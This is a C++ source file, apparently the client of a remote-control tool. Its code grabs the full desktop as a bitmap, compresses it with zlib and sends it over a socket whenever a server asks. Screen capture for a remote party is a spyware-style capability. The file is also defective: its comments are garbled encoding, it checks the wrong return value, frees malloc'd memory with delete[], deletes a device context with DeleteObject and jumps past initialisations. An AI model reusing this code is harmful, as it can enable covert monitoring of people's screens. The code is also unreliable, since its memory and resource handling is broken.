#include "stdafx.h"
#include "Client.h"
#include "../../common/zlib.h"

SOCKET sClient;
HANDLE hMyCmdWrite;
void OnServerScreen(SOCKET s, char* pData, int nLength) 
{
    //����������߷������յ����ݿ��Դ���screen
    tagPacket pkt;
    pkt.ucode = CLIENT_SCREEN_REPLY;
    pkt.nLength = 0;
    send(sClient,
        (char*)&pkt,
        sizeof(tagPacket),
        0);
}

void OnServerScreenData(SOCKET s, char* pData, int nLength)
{
    //��ȡ��Ļ�����ݣ���ת��bmp��ʽ

    //��ȡ���洰�ھ��
    HWND hDesktop = GetDesktopWindow();
    RECT rc = { 0 };
    HDC hDesktopDC = NULL;
    HDC hTmpDC = NULL;
    HDC hMemDC = NULL;
    BOOL bRet = FALSE;
    HBITMAP  hBitmap = NULL;
    HBITMAP hBitmapOld = NULL;
    int nWidth = 0;
    int nHeight = 0;
    int nSize = 0;
    char* pBuf = NULL;

    if (hDesktop == NULL) 
    {
        goto SAFE_EXIT;
    }

    //��ȡ���洰��DC
    hDesktopDC = GetDC(hDesktop);
    if (hDesktopDC == NULL) 
    {
        goto SAFE_EXIT;
    }

    //��������DC
    hMemDC = CreateCompatibleDC(hDesktopDC);
    if (hMemDC == NULL) 
    {
        goto SAFE_EXIT;
    }

    //��ȡ��͸�
    bRet = GetWindowRect(hDesktop, &rc);
    if (!bRet) 
    {
        goto SAFE_EXIT;
    }

    nWidth = rc.right - rc.left;
    nHeight = rc.bottom - rc.top;

    // ����λͼ

    //λͼ��Ϣͷ
    BITMAPINFOHEADER bmpInfoHeader;
    //λͼ�ļ�ͷ
    BITMAPFILEHEADER bmpfileHeader;
    BITMAPINFO bmpInfo;
    void *p;

    //RGB���ݵĴ�С
    nSize = 3 * nWidth * nHeight;
    //λͼ���ܴ�С
    pBuf = new char[nSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
    if (pBuf == NULL)
    {
        goto SAFE_EXIT;
    }

    DWORD dwSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + nSize;
    DWORD dwOffSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);

    //24λλͼ
    bmpInfoHeader.biBitCount = 24;
    bmpInfoHeader.biPlanes = 1;
    bmpInfoHeader.biCompression = BI_RGB;
    bmpInfoHeader.biWidth = nWidth;
    bmpInfoHeader.biHeight = nHeight;
    bmpInfoHeader.biSizeImage = 0;
    bmpInfoHeader.biClrUsed = 0;
    bmpInfoHeader.biClrImportant = 0;
    bmpInfoHeader.biXPelsPerMeter = nWidth;
    bmpInfoHeader.biYPelsPerMeter = nHeight;
    
    //λͼ��ͷҪΪ4D42
    bmpfileHeader.bfType = 0x4D42;
    bmpfileHeader.bfSize = dwSize;
    bmpfileHeader.bfReserved1 = 0;
    bmpfileHeader.bfReserved2 = 0;
    bmpfileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    

    bmpInfo.bmiHeader = bmpInfoHeader;
    //CreateDIBSection��������Ӧ�ó������ֱ��д���DIB���ú����ṩһ��ָ��λͼλֵλ�õ�ָ�롣����Ϊ�ļ�ӳ������ṩ�����������ʹ�øþ������λͼ��Ҳ������ϵͳΪλͼ�����ڴ档
    hBitmap = CreateDIBSection(hDesktopDC, &bmpInfo, DIB_RGB_COLORS, &p, NULL, 0);
    
    //SelectObject����ѡ�����ָ���豸������(DC)�Ķ����¶����滻����ͬ���͵�ǰһ������
    hBitmapOld = (HBITMAP)SelectObject(hMemDC, hBitmap);
    if (hBitmapOld == NULL) 
    {
        goto SAFE_EXIT;
    }

    //StretchBlt������һ��λͼ��Դ���θ��Ƶ�Ŀ����Σ������Ҫ�������ѹ����λͼ����ӦĿ����εĳߴ硣ϵͳ���ݵ�ǰ��Ŀ���豸�����������õ�����ģʽ�����ѹ��λͼ��
    StretchBlt(hMemDC, 0, 0, nWidth, nHeight, hDesktopDC, 0, 0, nWidth, nHeight, SRCCOPY);
    hTmpDC = GetDC(NULL);
    if (hTmpDC == NULL) 
    {
        goto SAFE_EXIT;
    }
    //SelectObject����ѡ�����ָ���豸������(DC)�Ķ����¶����滻����ͬ���͵�ǰһ������
    hBitmap = (HBITMAP)SelectObject(hMemDC, hBitmapOld);

    //��λͼͷд��λͼbuf
    bmpInfoHeader.biBitCount = 24;
    memcpy(pBuf,&bmpfileHeader,sizeof(bmpfileHeader));
    memcpy(pBuf + sizeof(bmpfileHeader),&bmpInfoHeader,sizeof(bmpInfoHeader));

    //GetDIBits��������ָ������λͼ��λ����ʹ��ָ���ĸ�ʽ��������ΪDIB���Ƶ��������С�
    int iError = GetDIBits(hTmpDC, hBitmap, 0, nHeight, pBuf + dwOffSize, (BITMAPINFO *)&bmpInfoHeader, DIB_RGB_COLORS);
    if (!bRet) 
    {
        goto SAFE_EXIT;
    }

    //��ȡ���ݣ��������

    uLong tlen = dwSize;
    char* buf = NULL;
    uLong blen = 0;

    /* ���㻺������С����Ϊ������ڴ� */
    blen = compressBound(tlen); /* ѹ����ĳ����ǲ��ᳬ��blen�� */
    if ((buf = (char*)malloc(sizeof(char) * blen + 4)) == NULL)
    {
        printf("no enough memory!\n");
    }

    /* ѹ�� */
    if (compress((Bytef*)buf, &blen, (Bytef*)pBuf, tlen) != Z_OK)
    {
        printf("compress failed!\n");
    }

    char tmp[8] = { 0 };
    itoa(dwSize, tmp,10);
    char *tmpbuff = (char*)malloc(sizeof(char) * blen + 8);

    //����ѹ������
    memcpy(tmpbuff, buf, blen);
    //����ԭʼ���ݵĴ�С������ĩβ
    memcpy(tmpbuff + blen, tmp,8);
    //����
    SendData(s, CLIENT_SCREEN_DATA, tmpbuff, blen+8);

    //�ͷ���Դ
SAFE_EXIT:
    if (pBuf != NULL) 
    {
        delete[] pBuf;
        pBuf = nullptr;
    }

    if (buf != NULL)
    {
        delete[] buf;
        buf = nullptr;
    }

    if (tmpbuff != NULL)
    {
        delete[] tmpbuff;
        tmpbuff = nullptr;
    }

    if (hBitmap != NULL)
    {
        DeleteObject(hBitmap);
    }

    if (hBitmapOld != NULL) 
    {
        DeleteObject(hBitmapOld);
    }

    if (hTmpDC != NULL) 
    {
        DeleteObject(hTmpDC);
    }

    if (hMemDC != NULL) 
    {
        DeleteDC(hMemDC);
    }

    if (hDesktopDC != NULL)
    {
        ReleaseDC(hDesktop, hDesktopDC);
    }
}